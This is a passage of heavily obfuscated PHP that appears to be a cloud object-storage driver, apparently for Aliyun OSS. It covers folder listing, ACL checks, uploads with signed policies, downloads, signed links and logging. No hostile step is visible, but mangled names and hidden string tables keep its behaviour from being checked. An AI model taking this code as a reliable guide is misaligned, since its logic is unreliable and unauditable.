$·×†Åéù[$¤Ìç¡Ğœ[234]] = $·×†Åéù[$¤Ìç¡Ğœ[88]] = 0; $·×†Åéù[$¤Ìç¡Ğœ[235]] = $·×†Åéù[$¤Ìç¡Ğœ[236]] = !0; if (empty($²šô‰ÙÃ)) { $¸Á³Ş² = $this->objectMeta($ÒÎñ‚—ß); if (!$¸Á³Ş²) { return $·×†Åéù; } $²šô‰ÙÃ = array($¤Ìç¡Ğœ[88] => strtotime($¸Á³Ş²[$¤Ìç¡Ğœ[1491]]), $¤Ìç¡Ğœ[79] => $¸Á³Ş²[$¤Ìç¡Ğœ[1490]] + 0, $¤Ìç¡Ğœ[1489] => $¸Á³Ş²[$¤Ìç¡Ğœ[1489]]); } if (isset($²šô‰ÙÃ[$¤Ìç¡Ğœ[1489]]) && $²šô‰ÙÃ[$¤Ìç¡Ğœ[1489]]) { $·×†Åéù[$¤Ìç¡Ğœ[238]] = trim($²šô‰ÙÃ[$¤Ìç¡Ğœ[1489]], $¤Ìç¡Ğœ[121]); } if (isset($²šô‰ÙÃ[$¤Ìç¡Ğœ[79]])) { $·×†Åéù[$¤Ìç¡Ğœ[79]] = $²šô‰ÙÃ[$¤Ìç¡Ğœ[79]]; } if (isset($²šô‰ÙÃ[$¤Ìç¡Ğœ[88]])) { $·×†Åéù[$¤Ìç¡Ğœ[88]] = $²šô‰ÙÃ[$¤Ìç¡Ğœ[88]]; } if (isset($²šô‰ÙÃ[$¤Ìç¡Ğœ[207]]) && !trim($·×†Åéù[$¤Ìç¡Ğœ[88]])) { $·×†Åéù[$¤Ìç¡Ğœ[88]] = $²šô‰ÙÃ[$¤Ìç¡Ğœ[207]]; } return $·×†Åéù; } private function folderInfo($¤æ¡·‹ş, $·‡„¨•± = false, $©Šïæ… = array()) { $›ªÈè¢Ó =& $_SERVER[«òÑğ]; $€–ÁÌ·• = array($›ªÈè¢Ó[32] => $this->pathThis($¤æ¡·‹ş), $›ªÈè¢Ó[87] => $this->getPathOuter($›ªÈè¢Ó[8] . $¤æ¡·‹ş), $›ªÈè¢Ó[33] => $›ªÈè¢Ó[78]); if ($·‡„¨•±) { return $€–ÁÌ·•; } $€–ÁÌ·•[$›ªÈè¢Ó[234]] = $€–ÁÌ·•[$›ªÈè¢Ó[88]] = 0; $€–ÁÌ·•[$›ªÈè¢Ó[235]] = $€–ÁÌ·•[$›ªÈè¢Ó[236]] = !0; if (empty($©Šïæ…)) { $¤æ¡·‹ş = rtrim($¤æ¡·‹ş, $›ªÈè¢Ó[8]) . $›ªÈè¢Ó[8]; $ğøˆ’š = $this->objectMeta($¤æ¡·‹ş); if (!$ğøˆ’š) { return $€–ÁÌ·•; } $©Šïæ… = array($›ªÈè¢Ó[234] => $ğøˆ’š[$›ªÈè¢Ó[580]][$›ªÈè¢Ó[1494]], $›ªÈè¢Ó[88] => strtotime($ğøˆ’š[$›ªÈè¢Ó[1491]])); } if (isset($©Šïæ…[$›ªÈè¢Ó[88]])) { $€–ÁÌ·•[$›ªÈè¢Ó[88]] = $©Šïæ…[$›ªÈè¢Ó[88]]; } if (isset($©Šïæ…[$›ªÈè¢Ó[234]])) { $€–ÁÌ·•[$›ªÈè¢Ó[234]] = $©Šïæ…[$›ªÈè¢Ó[234]]; } return $€–ÁÌ·•; } public function listPath($±ñÒÖñ¿, $ÃØ°Ãü½ = false) { $á®‘”ø» =& $_SERVER[«òÑğ]; $†ÅÕÛİƒ = $this->fileList($±ñÒÖñ¿, $á®‘”ø»[8], !0); foreach ($†ÅÕÛİƒ[$á®‘”ø»[85]] as $ò´Ÿğ¥Æ => $ò¹Íò‹¸) { $†ÅÕÛİƒ[$á®‘”ø»[85]][$ò´Ÿğ¥Æ] = $this->folderInfo($ò¹Íò‹¸, $ÃØ°Ãü½, $ò¹Íò‹¸); } foreach ($†ÅÕÛİƒ[$á®‘”ø»[86]] as $ò´Ÿğ¥Æ => $ò¹Íò‹¸) { $†ÅÕÛİƒ[$á®‘”ø»[86]][$ò´Ÿğ¥Æ] = $this->fileInfo($ò¹Íò‹¸[$á®‘”ø»[32]], $ÃØ°Ãü½, $ò¹Íò‹¸); } return $†ÅÕÛİƒ; } protected function infoChildren($øûéŸı, &$šöûæ“ã) { $¼æ°Á×¬ =& $_SERVER[«òÑğ]; $²Ä³İÈè = $this->fileList($øûéŸı, $¼æ°Á×¬[12], !0); $šöûæ“ã[$¼æ°Á×¬[81]] += count($²Ä³İÈè[$¼æ°Á×¬[85]]); $šöûæ“ã[$¼æ°Á×¬[80]] += count($²Ä³İÈè[$¼æ°Á×¬[86]]); foreach ($²Ä³İÈè[$¼æ°Á×¬[86]] as $Âò·˜ş÷) { if (!$Âò·˜ş÷ || !$Âò·˜ş÷[$¼æ°Á×¬[79]]) { continue; } $šöûæ“ã[$¼æ°Á×¬[79]] += $Âò·˜ş÷[$¼æ°Á×¬[79]]; } } public function has($Â¯ÑÁ ¨, $Š‘•Æ…ë = false, $È²ÉÉã = true) { $¾õœ¡Ì† =& $_SERVER[«òÑğ]; $Â¯ÑÁ ¨ = trim($Â¯ÑÁ ¨, $¾õœ¡Ì†[8]); $ºíà¬¨Õ = empty($Â¯ÑÁ ¨) && $Â¯ÑÁ ¨ !== $¾õœ¡Ì†[231] ? $¾õœ¡Ì†[12] : $Â¯ÑÁ ¨ . $¾õœ¡Ì†[8]; $ÂèçîöÊ = $¾õœ¡Ì†[12]; $€œšÇ© = 500; $¿È³äÒü = $•ù†Äá¹ = 0; while (!0) { check_abort(); $í¥¤ÛÌâ = array($¾õœ¡Ì†[1485] => $¾õœ¡Ì†[8], $¾õœ¡Ì†[1486] => $ºíà¬¨Õ, $¾õœ¡Ì†[1487] => $€œšÇ©, $¾õœ¡Ì†[1488] => $ÂèçîöÊ); try { $å—íÑ™ = $this->client->listObjects($this->bucket, $í¥¤ÛÌâ); } catch (OSS\Core\OssException $•¥›—ŞÍ) { $this->writeLog(__FUNCTION__ . $¾õœ¡Ì†[215] . $•¥›—ŞÍ->getMessage()); break; } $ÂèçîöÊ = $å—íÑ™->getNextMarker(); $“’‰·ëº = $å—íÑ™->getObjectList(); $Ñõ†Àºß = $å—íÑ™->getPrefixList(); if ($Š‘•Æ…ë) { if (count($“’‰·ëº) > 1 || count($“’‰·ëº) == 1 && $“’‰·ëº[0]->getKey() != $ºíà¬¨Õ) { $¿È³äÒü += count($“’‰·ëº) - 1; } if (!empty($Ñõ†Àºß)) { $•ù†Äá¹ += count($Ñõ†Àºß); } if ($ÂèçîöÊ === $¾õœ¡Ì†[12]) { break; } continue; } if ($È²ÉÉã) { if (!empty($“’‰·ëº)) { if (count($“’‰·ëº) > 1 || $“’‰·ëº[0]->getKey() != $ºíà¬¨Õ) { return !0; } } } else { if (!empty($Ñõ†Àºß)) { return !0; } } if ($ÂèçîöÊ === $¾õœ¡Ì†[12]) { break; } } if ($Š‘•Æ…ë) { return array($¾õœ¡Ì†[242] => $¿È³äÒü, $¾õœ¡Ì†[243] => $•ù†Äá¹); } return !1; } public function listAll($ãıñ³› ) { $Êû‚©ü— =& $_SERVER[«òÑğ]; $Ô÷–Ù„É = $this->fileList($ãıñ³› , $Êû‚©ü—[12], !0); $È“œ°Öè = array_to_keyvalue($Ô÷–Ù„É[$Êû‚©ü—[86]], $Êû‚©ü—[32]); foreach ($Ô÷–Ù„É[$Êû‚©ü—[85]] as $¯ĞÕñ‹ş) { if (is_string($¯ĞÕñ‹ş)) { $È“œ°Öè[$¯ĞÕñ‹ş] = array($Êû‚©ü—[79] => 0); } } return $this->listAllFiles($ãıñ³› , $È“œ°Öè); } public function canRead($õ‘‰á¿ñ) { $°Û£ç„í =& $_SERVER[«òÑğ]; $ç·ã§› = $this->pathAcl($õ‘‰á¿ñ); return $ç·ã§› == $°Û£ç„í[1495] || $ç·ã§› == $°Û£ç„í[627] ? !0 : !1; } public function canWrite($å°ÇŒ»±) { $ÀğÒî€¯ = $this->pathAcl($å°ÇŒ»±); return $ÀğÒî€¯ == $_SERVER[«òÑğ][627] ? !0 : !1; } public function pathAcl($¾öëÕÎ§) { $Á¨øŞÜ» =& $_SERVER[«òÑğ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÊØÖÓ­ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¾öëÕÎ§)); } catch (OSS\Core\OssException $Å¿„¶) { $this->writeLog(__FUNCTION__ . $Á¨øŞÜ»[215] . $Å¿„¶->getMessage()); return !1; } $Û›¹’°Û = $ÊØÖÓ­ == $Á¨øŞÜ»[37] ? $this->bucketAcl : $ÊØÖÓ­; if ($Û›¹’°Û == $Á¨øŞÜ»[1496]) { return $Á¨øŞÜ»[1495]; } if ($Û›¹’°Û == $Á¨øŞÜ»[1497]) { return $Á¨øŞÜ»[627]; } return $Û›¹’°Û; } private function chmodPath($Äò™Ìã, $¬¬„±‰× = '') { $ÕáÒ‹»ú =& $_SERVER[«òÑğ]; $õ¨¿¶î = empty($¬¬„±‰×) ? $ÕáÒ‹»ú[1497] : $¬¬„±‰×; $ÑÍìˆ º = array($ÕáÒ‹»ú[37], $ÕáÒ‹»ú[232], $ÕáÒ‹»ú[1496], $ÕáÒ‹»ú[1497]); if (!in_array($õ¨¿¶î, $ÑÍìˆ º)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Äò™Ìã), $õ¨¿¶î); } catch (OSS\Core\OssException $”íŸûÊ‹) { $this->writeLog(__FUNCTION__ . $ÕáÒ‹»ú[215] . $”íŸûÊ‹->getMessage()); return !1; } return !0; } public function getContent($Åõí–Ì) { return $this->fileSubstr($Åõí–Ì, -1); } public function setContent($ÜÉòø…¨, $šâ¯Â— = '') { $ëÅ£«Æ =& $_SERVER[«òÑğ]; try { $ÃË«ï‹ = $this->trafficLimit($ëÅ£«Æ[1498]); $ëíßîƒÉ = $this->client->putObject($this->bucket, $this->pathEncode($ÜÉòø…¨), $šâ¯Â—, $ÃË«ï‹); } catch (OSS\Core\OssException $’¯á±”Û) { $this->writeLog(__FUNCTION__ . $ëÅ£«Æ[215] . $’¯á±”Û->getMessage()); return !1; } $äÆŞ“¸å = array($ëÅ£«Æ[1492] => trim($ëíßîƒÉ[$ëÅ£«Æ[1489]], $ëÅ£«Æ[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÜÉòø…¨))); $this->updateObjMeta($ÜÉòø…¨, $äÆŞ“¸å); return isset($ëíßîƒÉ[$ëÅ£«Æ[1499]][$ëÅ£«Æ[297]]) ? !0 : !1; } private function updateObjMeta($û ¢£ëÊ, $ú…„åå) { $û ¢£ëÊ = $this->pathEncode($û ¢£ëÊ); try { $‹ğ¿ïöÅ = array(OSS\OssClient::OSS_HEADERS => $ú…„åå); $this->client->copyObject($this->bucket, $û ¢£ëÊ, $this->bucket, $û ¢£ëÊ, $‹ğ¿ïöÅ); } catch (OSS\Core\OssException $˜Ãß‹®‹) { $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][215] . $˜Ãß‹®‹->getMessage()); return !1; } return !0; } public function upload($­•Ó²Î‹, $ˆåÚÔ›í, $«ç…ìİï = false, $¡æ‹²Ş = REPEAT_REPLACE) { $®ñ†£Š =& $_SERVER[«òÑğ]; $‹©Ú‡¹ş = trim($­•Ó²Î‹, $®ñ†£Š[8]); $³¦…³°ñ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($®ñ†£Š[1492] => @md5_file($ˆåÚÔ›í)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($­•Ó²Î‹))); $³¦…³°ñ = $this->trafficLimit($®ñ†£Š[1498], $³¦…³°ñ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($‹©Ú‡¹ş), $ˆåÚÔ›í, $³¦…³°ñ); } catch (OSS\Core\OssException $‘¢øÏ®) { $this->writeLog(__FUNCTION__ . $®ñ†£Š[215] . $‘¢øÏ®->getMessage()); return !1; } return $this->getPathOuter($­•Ó²Î‹); } public function getHost() { $ú®²² =& $_SERVER[«òÑğ]; $Ûå÷‡‡ = explode($ú®²²[211], parent::getHost()); return $Ûå÷‡‡[0] . $ú®²²[211] . $this->bucket . $ú®²²[10] . $Ûå÷‡‡[1]; } public function uploadFormData($÷¸åªÅÉ, $øìÃ£è = 3600) { $Ø«ÊıŸó =& $_SERVER[«òÑğ]; if (!($¾œØ¼‘İ = $this->getHost())) { return !1; } $İ‘ÛŠ£™ = $øìÃ£è; $™†Ï³ãô = date($Ø«ÊıŸó[1500], time() + $İ‘ÛŠ£™); $Í½ô¨ªÂ = new DateTime($™†Ï³ãô); $¿¥ÜŸ­œ = $Í½ô¨ªÂ->format(DateTime::ISO8601); $…¿ß¿œğ = strpos($¿¥ÜŸ­œ, $Ø«ÊıŸó[374]); $¿¥ÜŸ­œ = substr($¿¥ÜŸ­œ, 0, $…¿ß¿œğ) . $Ø«ÊıŸó[1501]; $°ë„ášŠ = 1048576000 * 5; $ş˜«» = $this->pathFather($÷¸åªÅÉ); $¥â¬Ÿº = array($Ø«ÊıŸó[265] => $¿¥ÜŸ­œ, $Ø«ÊıŸó[268] => array(array($Ø«ÊıŸó[1502], 0, $°ë„ášŠ), array($Ø«ÊıŸó[270], $Ø«ÊıŸó[271], $ş˜«»))); $šê§¸Ä¯ = base64_encode(json_encode($¥â¬Ÿº)); $­œ¼¬¢Ğ = base64_encode(hash_hmac($Ø«ÊıŸó[1422], $šê§¸Ä¯, $this->secret, !0)); $™Ÿ¸ëÇü = array($Ø«ÊıŸó[1503] => $this->accessKey, $Ø«ÊıŸó[280] => $šê§¸Ä¯, $Ø«ÊıŸó[273] => $Ø«ÊıŸó[264], $Ø«ÊıŸó[1504] => $­œ¼¬¢Ğ, $Ø«ÊıŸó[209] => $¾œØ¼‘İ); $™Ÿ¸ëÇü = $this->trafficLimit($Ø«ÊıŸó[1498], $™Ÿ¸ëÇü, !0); return $™Ÿ¸ëÇü; } public function uploadMultiData($«¤·Ì‡, $‘›Ú£ = 3600) { $Ù‘ÑÚŠ =& $_SERVER[«òÑğ]; if (!($ÄÔ·µÁ = $this->getHost())) { return !1; } $™²Ø¨¢” = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($«¤·Ì‡)); return array($Ù‘ÑÚŠ[284] => $™²Ø¨¢”, $Ù‘ÑÚŠ[209] => $ÄÔ·µÁ . $Ù‘ÑÚŠ[8] . $this->pathEncode($«¤·Ì‡), $Ù‘ÑÚŠ[285] => gmdate($Ù‘ÑÚŠ[1505]), $Ù‘ÑÚŠ[97] => $«¤·Ì‡); } public function uploadMultiAuth($·¾ ûñ­, $¸şÍÚüÙ = array()) { if (isset($¸şÍÚüÙ[$_SERVER[«òÑğ][286]])) { return $this->uploadPartAuth($·¾ ûñ­, $¸şÍÚüÙ); } return $this->uploadListAuth($·¾ ûñ­, $¸şÍÚüÙ); } private function uploadPartAuth($õ—Ÿ¼§, $£ûü½çê = array()) { $¹åï§àë =& $_SERVER[«òÑğ]; $½´ÉƒºŸ = $£ûü½çê[$¹åï§àë[97]]; $—æŒÓà = $this->_getUploadAuth($½´ÉƒºŸ, $£ûü½çê); $Õµ×¯É‡ = array($¹åï§àë[289] => $—æŒÓà[$¹åï§àë[289]], $¹åï§àë[285] => $—æŒÓà[$¹åï§àë[285]]); if (isset($—æŒÓà[$¹åï§àë[1506]])) { $Õµ×¯É‡[$¹åï§àë[1506]] = $—æŒÓà[$¹åï§àë[1506]]; } return $Õµ×¯É‡; } private function uploadListAuth($»Ç’Ñ¡, $ü‘ˆ½ÎÎ = array()) { $ı„„¶ÙÃ =& $_SERVER[«òÑğ]; $ŞŞ·»¦› = $ü‘ˆ½ÎÎ[$ı„„¶ÙÃ[97]]; $“ë˜şçÀ = $ü‘ˆ½ÎÎ[$ı„„¶ÙÃ[284]]; $ûéÖŞ¾§ = $this->client->listParts($this->bucket, $this->pathEncode($ŞŞ·»¦›), $“ë˜şçÀ); $‡›…ïˆ† = $ûéÖŞ¾§->getListPart(); $´ÓÕìŠ = array(); foreach ($‡›…ïˆ† as $¢‹š—‡Ê) { $´ÓÕìŠ[] = array($ı„„¶ÙÃ[300] => $¢‹š—‡Ê->getPartNumber(), $ı„„¶ÙÃ[301] => trim($¢‹š—‡Ê->getETag(), $ı„„¶ÙÃ[121])); } if (!$´ÓÕìŠ) { return !1; } $ñåÖ›¹ = $this->_getUploadAuth($ŞŞ·»¦›, $ü‘ˆ½ÎÎ); return array($ı„„¶ÙÃ[289] => $ñåÖ›¹[$ı„„¶ÙÃ[289]], $ı„„¶ÙÃ[285] => $ñåÖ›¹[$ı„„¶ÙÃ[285]], $ı„„¶ÙÃ[292] => $´ÓÕìŠ); } private function _getUploadAuth($Î¦€ÏØæ, $‚´ì¬€Å) { $œà²†Ô =& $_SERVER[«òÑğ]; $ªù˜‡ í = gmdate($œà²†Ô[1505]); $Â«ÔÊõ = isset($‚´ì¬€Å[$œà²†Ô[286]]) ? $œà²†Ô[256] : $œà²†Ô[291]; $‘ş®½Ìî = array_intersect_key($‚´ì¬€Å, array_flip(array($œà²†Ô[286], $œà²†Ô[284]))); ksort($‘ş®½Ìî); $ş¢Æî…Â = $‘ş®½Ìî ? $œà²†Ô[76] . http_build_query($‘ş®½Ìî, null, $œà²†Ô[287], PHP_QUERY_RFC3986) : $œà²†Ô[12]; $˜§ Àû = array($Â«ÔÊõ, $œà²†Ô[12], $œà²†Ô[123], $ªù˜‡ í, "\170\x2d\x6f\x73\163\55\x64\141\164\x65\72{$ªù˜‡ í}", $œà²†Ô[8] . $this->bucket . $œà²†Ô[8] . $Î¦€ÏØæ . $ş¢Æî…Â); if (isset($‚´ì¬€Å[$œà²†Ô[286]])) { $é¢ò‰‰» = $this->trafficLimit($œà²†Ô[1498], array(), !0); if ($é¢ò‰‰») { $Î¦€ÏØæ = $œà²†Ô[1506]; array_splice($˜§ Àû, 5, 0, $Î¦€ÏØæ . $œà²†Ô[4] . $é¢ò‰‰»[$Î¦€ÏØæ]); } } $ÛĞ‹±ØÄ = implode($œà²†Ô[288], $˜§ Àû); $Â´€ëÏÑ = base64_encode(hash_hmac($œà²†Ô[1422], $ÛĞ‹±ØÄ, $this->secret, !0)); $¶ç¿¥„ = $œà²†Ô[1475] . $this->accessKey . $œà²†Ô[4] . $Â´€ëÏÑ; $È§å¹ëÆ = array($œà²†Ô[289] => $¶ç¿¥„, $œà²†Ô[285] => $ªù˜‡ í); if (!empty($é¢ò‰‰»)) { $È§å¹ëÆ = array_merge($È§å¹ëÆ, $é¢ò‰‰»); } return $È§å¹ëÆ; } public function download($¬‹·ÉáÈ, $Ñéæüí¹) { $ÚÅÔöÈ» =& $_SERVER[«òÑğ]; if ($this->isFolder($¬‹·ÉáÈ)) { return !1; } try { $¤şÂêÆÂ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ñéæüí¹); $¤şÂêÆÂ = $this->trafficLimit($ÚÅÔöÈ»[112], $¤şÂêÆÂ); $this->client->getObject($this->bucket, $this->pathEncode($¬‹·ÉáÈ), $¤şÂêÆÂ); } catch (OSS\Core\OssException $àß§ù¼õ) { $this->writeLog(__FUNCTION__ . $ÚÅÔöÈ»[215] . $àß§ù¼õ->getMessage()); return !1; } return $Ñéæüí¹; } public function fileSubstr($ûœ¶¦çó, $“¶¡ú‰° = 0, $èÙ×ûÉ = false) { if ($“¶¡ú‰° === -1) { $ÁÅ–Ëµ = array(); } else { if ($èÙ×ûÉ === !1) { $²›äÛ¬¨ = $this->size($ûœ¶¦çó); } else { $²›äÛ¬¨ = $“¶¡ú‰° + $èÙ×ûÉ - 1; } $ÁÅ–Ëµ = array(OSS\OssClient::OSS_RANGE => "{$“¶¡ú‰°}\x2d{$²›äÛ¬¨}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ûœ¶¦çó), $ÁÅ–Ëµ); } catch (OSS\Core\OssException $ôŸé¢¨º) { $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][215] . $ôŸé¢¨º->getMessage()); think_exception($ôŸé¢¨º->getMessage()); return !1; } } private function trafficLimit($¶½äçªò, $î¢¡âèû = array(), $½š¶Ÿ« = false) { $ÄŞº¡Ğó =& $_SERVER[«òÑğ]; if ($¶½äçªò == $ÄŞº¡Ğó[1498] && $this->isUploadServer() || $¶½äçªò == $ÄŞº¡Ğó[112] && $this->isFileOutServer()) { return $î¢¡âèû; } $íã€¤ÛË = floatval($GLOBALS[$ÄŞº¡Ğó[6]][$ÄŞº¡Ğó[92]][$ÄŞº¡Ğó[110]][$¶½äçªò]) * 1024 * 1024 * 8; if (!$íã€¤ÛË) { return $î¢¡âèû; } $íã€¤ÛË = $íã€¤ÛË < 819200 ? 819200 : ($íã€¤ÛË > 838860800 ? 838860800 : $íã€¤ÛË); if ($½š¶Ÿ«) { $î¢¡âèû[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($íã€¤ÛË); } else { if (!isset($î¢¡âèû[OSS\OssClient::OSS_HEADERS])) { $î¢¡âèû[OSS\OssClient::OSS_HEADERS] = array(); } $î¢¡âèû[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($íã€¤ÛË); } return $î¢¡âèû; } public function link($¦²›®€Ï, $ñšßÊã° = array()) { $°ÊÈ×…Ê =& $_SERVER[«òÑğ]; if (!$this->exist($¦²›®€Ï) || $this->isFolder($¦²›®€Ï)) { return !1; } try { $ñšßÊã° = $this->trafficLimit($°ÊÈ×…Ê[112], $ñšßÊã°, !0); $ÚŒìë = $this->client->signUrl($this->bucket, $this->pathEncode($¦²›®€Ï), 3600 * 12, $°ÊÈ×…Ê[1507], $ñšßÊã°); return $this->getCdnLink($ÚŒìë); } catch (OSS\Core\OssException $±¬º£ò©) { $this->writeLog(__FUNCTION__ . $°ÊÈ×…Ê[215] . $±¬º£ò©->getMessage()); return !1; } } public function fileOut($µ¡ÛßÌ§, $Ø³½åáŠ = false, $™ÚÛ­ù” = false, $ìË´ô» = '') { $ˆ¯Â´ö =& $_SERVER[«òÑğ]; if ($this->isFileOutServer()) { return $this->fileOutServer($µ¡ÛßÌ§, $Ø³½åáŠ, $™ÚÛ­ù”, $ìË´ô»); } if (!$™ÚÛ­ù”) { $™ÚÛ­ù” = $this->pathThis($µ¡ÛßÌ§); } $™ÚÛ­ù” = rawurlencode($™ÚÛ­ù”); $ƒÅºÑÜ— = get_file_mime(get_path_ext($™ÚÛ­ù”)); if ($ƒÅºÑÜ— == $ˆ¯Â´ö[251]) { return parent::fileOut($µ¡ÛßÌ§, $Ø³½åáŠ, $™ÚÛ­ù”, $ìË´ô»); } $Ø³½åáŠ = $Ø³½åáŠ ? $ˆ¯Â´ö[1508] : $ˆ¯Â´ö[1509]; $í”Ëö‡¥ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ˆ¯Â´ö[1510] . rawurlencode("{$Ø³½åáŠ}\x3b\x66\151\x6c\x65\156\141\155\145\75{$™ÚÛ­ù”}")); $í”Ëö‡¥[OSS\OssClient::OSS_SUB_RESOURCE] .= $ˆ¯Â´ö[1511] . rawurlencode($ƒÅºÑÜ—); $¥¯áÀ’Œ = $this->link($µ¡ÛßÌ§, $í”Ëö‡¥); $this->fileOutLink($¥¯áÀ’Œ); } public function fileOutServer($õØ„¦ä¼, $¬³êóä£ = false, $ÊÚï½õ = false, $ Í†± = '') { parent::fileOut($õØ„¦ä¼, $¬³êóä£, $ÊÚï½õ, $ Í†±); } public function fileOutImage($Øç¶ûÒÅ, $÷¶¥œÜã = 250) { if ($this->size($Øç¶ûÒÅ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Øç¶ûÒÅ, $÷¶¥œÜã); } $¢‰óÜğá = array(OSS\OssClient::OSS_PROCESS => $_SERVER[«òÑğ][1472] . $÷¶¥œÜã); $ğ¦ßœé¿ = $this->link($Øç¶ûÒÅ, $¢‰óÜğá); $this->fileOutLink($ğ¦ßœé¿); } public function fileOutImageServer($·»¢Û¸‹, $Áº™Şí— = 250) { parent::fileOutImage($·»¢Û¸‹, $Áº™Şí—); } public function fileOutLink($’ë°¢Ã™) { $Ø°Êıú =& $_SERVER[«òÑğ]; if (!$this->isCdnHost() && substr($’ë°¢Ã™, 0, 7) == $Ø°Êıú[219]) { $’ë°¢Ã™ = $Ø°Êıú[220] . substr($’ë°¢Ã™, 7); } header($Ø°Êıú[175] . $’ë°¢Ã™); die; } public function hashMd5($¹†à•Š, $Í„ş§ºï = '') { $¨º ¨Î =& $_SERVER[«òÑğ]; $¡Ü˜ÜÏã = $this->_objectMeta($¹†à•Š); if (!$¡Ü˜ÜÏã) { return $¨º ¨Î[12]; } if (!isset($¡Ü˜ÜÏã[$¨º ¨Î[1492]]) && !empty($Í„ş§ºï)) { $²«ïÌÕŞ = $this->updateObjMeta($¹†à•Š, array($¨º ¨Î[1492] => $Í„ş§ºï)); $¡Ü˜ÜÏã[$¨º ¨Î[1492]] = $²«ïÌÕŞ ? $Í„ş§ºï : $¨º ¨Î[12]; } return isset($¡Ü˜ÜÏã[$¨º ¨Î[1492]]) ? strtolower($¡Ü˜ÜÏã[$¨º ¨Î[1492]]) : $¨º ¨Î[12]; } public function size($Äƒ»Ş¯ó) { $¶ËÒ·Ä = $this->objectMeta($Äƒ»Ş¯ó); return $¶ËÒ·Ä ? $¶ËÒ·Ä[$_SERVER[«òÑğ][79]] : 0; } public function info($»¤üÃ‚‹) { if ($this->isFolder($»¤üÃ‚‹)) { return $this->folderInfo($»¤üÃ‚‹); } else { if ($this->isFile($»¤üÃ‚‹)) { return $this->fileInfo($»¤üÃ‚‹); } } return !1; } public function exist($Ø…Ã¯Ô) { return $this->isFile($Ø…Ã¯Ô) || $this->isFolder($Ø…Ã¯Ô); } public function isFile($ìÓÃ§±½) { return !$this->isFolder($ìÓÃ§±½) && $this->objectMeta($ìÓÃ§±½); } public function isFolder($Ó“ æšÑ) { return $this->cacheMethod($_SERVER[«òÑğ][180], $Ó“ æšÑ); } protected function objectMeta($›èê¾ÛÃ) { return $this->cacheMethod($_SERVER[«òÑğ][182], $›èê¾ÛÃ); } protected function _objectMeta($ÏÄÂ¤”ö) { $ééÕöì” =& $_SERVER[«òÑğ]; try { $æ§¹… = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ÏÄÂ¤”ö)); } catch (OSS\Core\OssException $Ï‡ÙÄ´§) { $this->writeLog(__FUNCTION__ . $ééÕöì”[215] . $Ï‡ÙÄ´§->getMessage()); $æ§¹… = !1; } if ($æ§¹…) { $æ§¹…[$ééÕöì”[79]] = intval($æ§¹…[$ééÕöì”[1490]]); } return $æ§¹…; } protected function _isFolder($ú¤º»Ä) { $ûåÏ¥õ… =& $_SERVER[«òÑğ]; if ($ú¤º»Ä == $ûåÏ¥õ…[12] || $ú¤º»Ä == $ûåÏ¥õ…[8]) { return !0; } $Ûœí¬„ = array($ûåÏ¥õ…[1485] => $ûåÏ¥õ…[8], $ûåÏ¥õ…[1486] => rtrim($ú¤º»Ä, $ûåÏ¥õ…[8]) . $ûåÏ¥õ…[8], $ûåÏ¥õ…[1487] => 1, $ûåÏ¥õ…[1488] => $ûåÏ¥õ…[12]); $Íñ¶èƒÏ = $this->client->listObjects($this->bucket, $Ûœí¬„); if ($Íñ¶èƒÏ->getObjectList() || $Íñ¶èƒÏ->getPrefixList()) { return !0; } return !1; } public function writeLog($û­Õü¡Î = '', $ñ–ı®¼È = false) { $Û•øï”ª =& $_SERVER[«òÑğ]; $ŠˆÓ®“„ = in_array(ACTION, array($Û•øï”ª[213], $Û•øï”ª[214])); if (!$ŠˆÓ®“„ && !GLOBAL_DEBUG) { return; } $İçÒú½× = 0; if (stripos($û­Õü¡Î, $Û•øï”ª[1512]) !== !1) { $İçÒú½× = 1; $¢ğÈû€ = explode($Û•øï”ª[1513], $û­Õü¡Î); $û­Õü¡Î = !empty($¢ğÈû€[1]) ? $¢ğÈû€[1] : $û­Õü¡Î; } else { if (stripos($û­Õü¡Î, $Û•øï”ª[1514])) { $İçÒú½× = 2; $¢ğÈû€ = explode($Û•øï”ª[1514], $û­Õü¡Î); $¢ğÈû€ = explode($Û•øï”ª[4], $¢ğÈû€[0]); $û­Õü¡Î = !empty($¢ğÈû€[1]) ? $¢ğÈû€[1] : $û­Õü¡Î; } } if ($ŠˆÓ®“„ && I18n::getType() == $Û•øï”ª[1515]) { if ($İçÒú½× == 1) { $û­Õü¡Î = str_replace($Û•øï”ª[1516], $Û•øï”ª[1517], $û­Õü¡Î); } else { if ($İçÒú½× == 2) { $¢ğÈû€ = explode($Û•øï”ª[215], $¢ğÈû€[0]); $®µÅÆ¼í = isset($¢ğÈû€[1]) ? $¢ğÈû€[1] : $Û•øï”ª[12]; $Á¬şĞåœ = array($Û•øï”ª[1518] => $Û•øï”ª[1519], $Û•øï”ª[1520] => $Û•øï”ª[1521], $Û•øï”ª[1522] => $Û•øï”ª[1523], $Û•øï”ª[1524] => $Û•øï”ª[1525], $Û•øï”ª[1526] => $Û•øï”ª[1527], $Û•øï”ª[1528] => $Û•øï”ª[1529], $Û•øï”ª[1530] => $Û•øï”ª[1531], $Û•øï”ª[1532] => $Û•øï”ª[1533], $Û•øï”ª[1534] => $Û•øï”ª[1535], $Û•øï”ª[1536] => $Û•øï”ª[1537]); if (isset($Á¬şĞåœ[$®µÅÆ¼í])) { $û­Õü¡Î = $Á¬şĞåœ[$®µÅÆ¼í]; } } } if (stripos($û­Õü¡Î, $Û•øï”ª[1538])) { $û­Õü¡Î = $Û•øï”ª[1539]; } } if (!trim($û­Õü¡Î)) { return; } 